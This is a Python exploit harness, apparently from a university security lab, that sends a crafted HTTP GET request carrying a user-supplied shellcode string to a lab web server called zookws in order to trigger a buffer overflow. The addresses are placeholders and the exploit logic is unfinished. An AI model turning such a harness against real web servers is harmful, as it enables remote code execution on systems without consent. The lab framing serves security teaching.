#!/usr/bin/python
import sys
import socket
import traceback
import urllib.parse
import struct
#import bytes

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer = 0x34567890
stack_saved_ebp = "%28%EE%FF%BF"
#stack_retaddr = stack_saved_ebp + 4

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    req =   "GET "+shellcode+' HTTP/1.0\r\n' + \
	    "\r\n"
    #req = urllib.parse.quote(req)
    return req.encode()

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
	    resp = resp + rbuf.decode()
	    rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 4:
    print("Usage: " + sys.argv[0] + " host, port, link")
    exit()

try:
    #shellfile = open("shellcode.bin", "r")
    #shellcode = shellfile.read()
    shellcode=sys.argv[3]
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

